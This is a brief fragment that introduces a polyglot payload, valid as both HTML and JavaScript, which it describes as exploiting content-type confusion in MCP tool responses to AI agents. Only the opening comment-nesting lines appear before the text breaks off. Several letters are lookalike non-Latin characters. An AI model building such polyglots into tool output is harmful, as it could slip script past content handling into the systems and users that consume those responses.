A polyglot file that is simultaneously valid HTΜL and JavaScript, exploiting content-type confusion in ΜCP tool responses:

Ρolyglot payload (valid as both text/html and application/javascript):
--><!--
/*
<!DΟCTΥPE html><!--*/
<html>
<body>
